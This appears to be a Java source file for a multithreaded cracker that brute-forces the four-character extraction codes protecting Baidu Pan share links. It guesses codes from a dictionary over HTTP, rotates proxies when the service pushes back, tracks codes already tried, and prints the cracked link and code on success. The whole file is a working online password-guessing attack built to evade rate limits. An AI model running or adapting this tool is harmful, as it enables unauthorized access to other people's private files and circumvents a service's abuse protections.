package priv.light.baidu;

import lombok.Data;
import lombok.NonNull;

import java.io.File;
import java.io.IOException;
import java.util.Collections;
import java.util.HashSet;
import java.util.Optional;
import java.util.Set;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicLong;
import java.util.concurrent.atomic.AtomicReference;

/**
 * @author Light
 * @date 2022/3/30 21:37
 */

@Data
public class CrackPasswordPool implements ThreadFactory, Runnable {

    private static final String NO_PASSWORD_CAN_TEST = "没有密码可验证.";
    private static final AtomicLong COUNTER = new AtomicLong();
    private static final String THREAD_POOL_NAME = "MyPool Thread Pool-Thread-";
    public static final int CORE_POOL_SIZE;
    public static final int MAX_POOL_SIZE;

    static{
        CORE_POOL_SIZE = Runtime.getRuntime().availableProcessors() + 1;
        MAX_POOL_SIZE = 2 * CORE_POOL_SIZE;
    }

    private final ThreadPoolExecutor threadPool;

    private final PasswordDictionary passwordDictionary;
    private final PasswordDictionary passwordHasTestDictionary;
    private final Set<String> passwords;
    private final Set<String> hasTestPasswords;
    private final HttpUtil httpUtil;
    private final AtomicReference<String> truePassword;

    public CrackPasswordPool(@NonNull HttpUtil httpUtil, @NonNull File passwordFile, @NonNull File hasTestPasswordFile) throws IOException {
        int count = 4;
        this.passwordDictionary = new PasswordDictionary(count, passwordFile);
        this.passwordHasTestDictionary = new PasswordDictionary(count, hasTestPasswordFile);

        Set<String> passwords;
        if (!passwordFile.exists() || passwordFile.length() == 0) {
            this.passwordDictionary.writeToFile();
        }
        passwords = this.passwordDictionary.readPassword();

        if (hasTestPasswordFile.exists() && hasTestPasswordFile.length() > 0) {
            Set<String> hasTestPasswords = this.passwordHasTestDictionary.readPassword();
            passwords.removeAll(hasTestPasswords);
        }
        this.passwords = Collections.synchronizedSet(passwords);
        this.hasTestPasswords = Collections.synchronizedSet(new HashSet<>());

        int keepAliveTime = 2;

        BlockingQueue<Runnable> blockingQueue = new LinkedBlockingQueue<>(Integer.MAX_VALUE / 100);
        ThreadPoolExecutor.CallerRunsPolicy callerRunsPolicy = new ThreadPoolExecutor.CallerRunsPolicy();

        this.threadPool = new ThreadPoolExecutor(CORE_POOL_SIZE, MAX_POOL_SIZE, keepAliveTime, TimeUnit.MINUTES, blockingQueue, callerRunsPolicy);
        this.httpUtil = httpUtil;
        this.truePassword = new AtomicReference<>();
    }

    @Override
    public Thread newThread(Runnable r) {
        String threadName = THREAD_POOL_NAME + COUNTER.getAndIncrement();
        Thread thread = new Thread(r, threadName);
        thread.setDaemon(true);

        return thread;
    }

    public boolean execute() {
        if (!this.shouldContinue()) {
            return false;
        }

        this.threadPool.execute(this);
        return this.shouldContinue();
    }

    private boolean shouldContinue() {
        return !this.httpUtil.getHasDispose().get() && !(this.threadPool.isShutdown() || this.threadPool.isTerminating() || this.threadPool.isTerminated());
    }

    @Override
    public void run() {
        ResponseResult responseResult = this.call();
        try {
            String password = responseResult.getPassword();
            TestPasswordResult testPasswordResult = responseResult.getTestPasswordResult();

            if (TestPasswordResult.SUCCESS_FOUND.equals(testPasswordResult)) {
                this.truePassword.set(password);
                this.httpUtil.dispose();
                return;
            }

            boolean needRetry;
            boolean needChangeProxy = TestPasswordResult.NEED_CHANGE_PROXY.equals(testPasswordResult);
            if (needChangeProxy) {
                this.httpUtil.configProxy(responseResult.getProxy());
                needRetry = true;
            } else {
                needRetry = TestPasswordResult.FOUND_ERROR.equals(testPasswordResult);
            }

            if (needRetry) {
                if (this.shouldContinue()) {
                    this.passwords.add(password);
                }
            } else {
                System.out.println(password);
                this.hasTestPasswords.add(password);
            }
        } catch (NullPointerException e) {
            if (NO_PASSWORD_CAN_TEST.equals(e.getMessage())) {
                this.midwayShutdown();
            }
        }
    }

    public void shutdown() {
        if (this.httpUtil.getHasDispose().get()) {
            this.successFoundShutdown();
        } else {
            this.midwayShutdown();
        }
    }

    private void successFoundShutdown() {
        this.threadPool.shutdownNow();
        String truePassword = this.truePassword.get();
        System.out.println(truePassword);

        Set<String> truePasswords = new HashSet<>();
        truePasswords.add("https://pan.baidu.com/s/1" + this.httpUtil.getSUrl() + " 的提取码: " + truePassword);

        this.disposePasswordDictionary(truePasswords);
    }

    private void midwayShutdown() {
        this.threadPool.shutdownNow();
        while (true) {
            try {
                if (this.threadPool.awaitTermination(1, TimeUnit.SECONDS)) {
                    this.disposePasswordDictionary(this.hasTestPasswords);
                    return;
                }
            } catch (InterruptedException e) {
                this.disposePasswordDictionary(this.hasTestPasswords);
                return;
            }
        }
    }

    private void disposePasswordDictionary(Set<String> passwordsToSave) {
        try {
            this.passwordHasTestDictionary.appendPassword(passwordsToSave);
        } catch (IOException e) {
            e.printStackTrace();
        }

        this.passwordDictionary.dispose();
        this.passwordHasTestDictionary.dispose();
    }

    private ResponseResult call() {
        String password;
        synchronized (this.passwords) {
            Optional<String> any = this.passwords.parallelStream().findAny();
            if (!any.isPresent()) {
                throw new NullPointerException(NO_PASSWORD_CAN_TEST);
            }

            password = any.get();
            this.passwords.remove(password);
        }

        ResponseResult responseResult;
        try {
            responseResult = this.httpUtil.executeRequest(password);
        } catch (InterruptedException | IOException e) {
            responseResult = new ResponseResult(password, null);
            responseResult.setTestPasswordResult(TestPasswordResult.FOUND_ERROR);
        }

        return responseResult;
    }

}
